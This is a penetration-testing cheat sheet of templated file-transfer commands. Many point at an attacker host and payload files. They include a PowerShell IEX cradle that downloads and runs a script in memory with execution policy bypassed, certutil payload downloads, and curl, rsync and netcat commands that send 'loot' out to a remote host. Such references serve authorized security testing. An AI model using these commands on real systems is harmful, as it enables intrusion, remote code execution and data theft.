# File Transfer

> Download, upload, and transfer files using wget, curl, scp, nc, and platform-specific methods

<!-- tags: wget, curl, scp, nc, transfer, download, upload, exfil -->

---

## download file wget
Download a file from a URL.

```bash
wget {{URL:url:http://10.10.10.1:8000/payload.sh}} -O {{OUTFILE:file:payload.sh}}
```

<!-- meta: risk=low | phase=misc | tags=wget,download,http -->

---

## wget recursive mirror download
Mirror a website or directory listing recursively.

```bash
wget -r -np -nH --cut-dirs={{DEPTH:int:1}} {{URL:url:http://10.10.10.1:8000/tools/}}
```

<!-- meta: risk=low | phase=misc | tags=wget,recursive,mirror -->

---

## download file curl
Download a file with curl, following redirects.

```bash
curl -Lo {{OUTFILE:file:payload.sh}} {{URL:url:http://10.10.10.1:8000/payload.sh}}
```

<!-- meta: risk=low | phase=misc | tags=curl,download,http -->

---

## upload file curl POST
Upload a file to an upload server via POST.

```bash
curl -X POST {{URL:url:http://10.10.10.1:8000/upload}} -F "files=@{{FILE:file:loot.zip}}"
```

<!-- meta: risk=low | phase=misc | tags=curl,upload,post -->

---

## transfer file SCP SSH
Copy a file to or from a remote host over SSH.

```bash
scp {{FILE:file:./payload.sh}} {{USER:str:root}}@{{HOST:ip:10.10.10.1}}:{{REMOTE:str:/tmp/}}
```

<!-- meta: risk=low | phase=misc | tags=scp,ssh,transfer -->

---

## rsync over SSH remote
Sync files to a remote host over SSH with progress.

```bash
rsync -avz --progress -e "ssh -p {{PORT:port:22}}" {{SRC:dir:./loot/}} {{USER:str:root}}@{{HOST:ip:10.10.10.1}}:{{REMOTE:str:/tmp/loot/}}
```

<!-- meta: risk=low | phase=misc | tags=rsync,ssh,sync,transfer -->

---

## send file netcat sender
Send a file to a listening netcat receiver.

```bash
nc {{HOST:ip:10.10.10.1}} {{PORT:port:9001}} < {{FILE:file:payload.sh}}
```

<!-- meta: risk=low | phase=misc | tags=nc,netcat,send,transfer -->

---

## base64 encode file transfer
Encode a file as base64 for copy-paste transfer to restricted targets.

```bash
base64 -w0 {{FILE:file:payload.sh}} && echo
```

<!-- meta: risk=safe | phase=misc | tags=base64,encode,copypaste -->

---

## base64 decode file target
Decode a base64 string back to a binary file on the target.

```bash
echo "{{B64:str:base64_string_here}}" | base64 -d > {{OUTFILE:file:payload.sh}} && chmod +x {{OUTFILE:file:payload.sh}}
```

<!-- meta: risk=low | phase=misc | tags=base64,decode,target -->

---

## download file certutil windows
Download a file on a Windows target using certutil.

```bash
certutil -urlcache -split -f {{URL:url:http://10.10.10.1:8000/payload.exe}} {{OUTFILE:file:C:\Temp\payload.exe}}
```

<!-- meta: risk=low | phase=misc | tags=certutil,windows,download -->

---

## powershell download cradle windows
Download and optionally execute a file on a Windows target.

```bash
powershell -ep bypass -c "IWR -Uri '{{URL:url:http://10.10.10.1:8000/payload.exe}}' -OutFile '{{OUTFILE:file:C:\Temp\payload.exe}}'"
```

<!-- meta: risk=low | phase=misc | tags=powershell,windows,download,cradle -->

---

## powershell IEX memory cradle windows
Download and execute a PowerShell script in memory on a Windows target.

```bash
powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('{{URL:url:http://10.10.10.1:8000/script.ps1}}')"
```

<!-- meta: risk=med | phase=misc | tags=powershell,iex,memory,windows -->

---

## pull files SCP PEM key
Copy a remote directory tree to local Desktop using a PEM key.

```bash
scp -i {{KEY:file:./key.pem}} -r {{USER:str:ec2-user}}@{{HOST:ip}}:{{REMOTE:str:/path/to/dir/}} {{LOCAL:dir:~/Desktop}}
```

<!-- meta: risk=safe | phase=misc | tags=scp,pem,pull,recursive -->

---

## SCP sshpass password auth
Copy files via SCP non-interactively using a password.

```bash
sshpass -p '{{PASSWORD:str}}' scp -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -r {{LOCAL_GLOB:str:~/Desktop/*}} {{USER:str:user}}@{{HOST:ip}}:{{REMOTE:str:/path/to/dir/}}
```

<!-- meta: risk=med | phase=misc | tags=scp,sshpass,password -->

---

## rsync local backup mirror
Mirror a local directory to a backup location preserving attributes.

```bash
rsync -a {{SRC:dir:/home/}} {{DEST:dir:/backups/home/}}
```

<!-- meta: risk=safe | phase=misc | tags=rsync,local,backup -->

---

## rsync compressed to remote
Transfer files to a remote host with rsync over SSH and compression.

```bash
rsync -avz {{SRC:dir:/home/}} {{USER:str:root}}@{{HOST:ip}}:{{DEST:str:/backups/}}
```

<!-- meta: risk=low | phase=misc | tags=rsync,compress,remote -->
